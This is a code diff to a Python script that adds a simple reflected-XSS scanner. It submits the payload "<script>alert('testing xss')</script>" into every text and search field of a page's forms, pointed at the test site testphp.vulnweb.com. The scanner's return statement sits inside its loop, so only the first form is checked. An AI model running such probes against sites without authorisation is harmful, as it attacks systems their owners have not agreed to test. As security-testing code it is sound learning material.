@@ -26,6 +26,7 @@ def get_all_forms(url: str) -> ResultSet:
     soup = bs(requests.get(url).content, 'html.parser')
     return soup.find_all("form")
 
+#-------------------------------------------------------
 def get_form_details(form: bs) -> dict:
     """ Returns dictionary of form details. """
     form_details = {}
@@ -44,16 +45,69 @@ def get_form_details(form: bs) -> dict:
 
     return form_details
 
+#-------------------------------------------------------
+def submit_form(form_details: dict, url: str, value: str) -> requests.Response:
+    """ Submits form and returns HTTP response after form submission. """
+    target_url = urljoin(url, form_details["action"])
+    inputs = form_details["inputs"]
+    data = {}
+
+    for input in inputs:
+
+        if input["type"] == "text" or input["type"] == "search":
+            input["value"] = value
+            input_name = input.get("name")
+            input_value = input.get("value")
+            
+            if input_name and input_value:
+                data[input_name] = input_value
+
+    print(f"[+] Submitting malicious payload to {target_url}")
+    print(f"[+] Data: {data}")
+
+    if form_details["method"] == "post":
+        return requests.post(target_url, data=data)
+    else:
+        return requests.get(target_url, params=data)
+    
+#-------------------------------------------------------
+def scan_xss(url: str) -> bool:
+    is_vulnerable = False
+    forms = get_all_forms(url)
+
+    print(f"[+] Detected {len(forms)} forms on {url}.")
+
+    js_script = "<script>alert('testing xss')</script>"
+
+    for form in forms:
+        form_details = get_form_details(form)
+        content = submit_form(form_details, url, js_script).content.decode()
+
+        if js_script in content:
+            print(f"[+] XSS Detected on {url}")
+            print(f"[*] Form details:")
+            pprint(form_details)
+            is_vulnerable = True
+
+        return is_vulnerable
+
+
+#-------------------------------------------------------
 if __name__ == "__main__":
     url = "http://testphp.vulnweb.com"
-    forms = get_all_forms(url)
-    form_details = []
+    if scan_xss(url):
+        print("The website is XSS vulnerable")
+    # forms = get_all_forms(url)
+    
 
-    print(forms)
-    print(type(forms))
+    # print(type(forms))
+    # print(type(get_form_details(forms[0])))
 
-    for i in forms:
-        print(get_form_details(i))
+    # for i in forms:
+    #     form_details = get_form_details(i)
+    #     for k,v in form_details.items():
+    #        print(f"{k} : {v}")
+
     # for i in form_details:
     #     for k, v in i:
     #         print(f"{k} : {v}")
